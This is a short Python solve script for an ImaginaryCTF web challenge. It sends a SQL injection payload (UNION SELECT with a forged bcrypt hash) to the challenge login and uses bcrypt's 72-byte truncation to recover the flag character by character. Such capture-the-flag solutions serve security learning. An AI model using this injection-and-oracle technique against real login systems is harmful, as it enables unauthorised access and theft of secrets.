# bcrypt will result in the string parameter being truncated to a maximum length of 72 bytes.

import requests
import bcrypt
from string import printable 

url = "http://login.chal.imaginaryctf.org/"
flag = "ictf{why_are_bcrypt_truncating"
count = 71 - len(flag)
while True:
  for chr in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!@?}":
    test = flag + chr
    pad = 'A'*count
    password = bcrypt.hashpw(f"{pad+test}".encode(), bcrypt.gensalt(4))
    r = requests.post(url+"?688a35c685a7a654abc80f8e123ad9f0", data={"username": f"1' UNION SELECT 'xon1l','{password.decode()}' -- -","password": f"{pad}"})
    if ('xon1l' in r.text):
      flag += chr
      count -= 1
      print("flag:"+flag)
      if (chr == '}'):
        print("Done!")
        exit()
      break
    else:
      print(f"Trying: {chr}")
      
      
# flag:ictf{why_are_bcrypt_truncating_my_passwords?!}
   
